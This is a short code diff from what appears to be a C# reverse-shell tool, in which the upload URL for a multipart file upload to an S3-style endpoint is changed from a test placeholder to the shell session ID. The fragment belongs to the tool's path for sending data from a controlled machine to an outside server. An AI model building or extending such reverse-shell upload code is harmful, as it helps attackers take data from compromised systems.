@@ -44,8 +44,7 @@ namespace WebSocketReverseShellDotNet.utils
                                      Constants.S3_API_ENDPOINT +
                                      Constants.S3_API_UPLOAD +
                                      Constants.S3_API_UPLOAD_SESSION_PARAM 
-                                     + "asd";
-                                     //+ReverseShellSession.SessionId;
+                                     +ReverseShellSession.SessionId;
 
                         using (MultipartFormDataContent content = new MultipartFormDataContent())
                         {
